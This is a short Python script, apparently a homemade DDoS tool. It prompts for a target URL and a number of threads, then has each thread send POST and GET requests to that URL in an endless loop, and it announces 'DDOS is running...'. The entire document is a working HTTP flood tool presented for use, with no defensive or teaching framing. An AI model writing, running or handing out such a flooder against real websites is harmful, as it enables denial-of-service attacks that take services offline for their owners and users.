import requests
from threading import Thread

url = input('Url: ')

thrnom = input('Threads :')

def ddos():

    while(1<10):

        spam = requests.post(url)

        spam2 = requests.get(url)

for i in range(int(thrnom)):

    thr = Thread(target = ddos)

    thr.start()

print('DDOS is running...')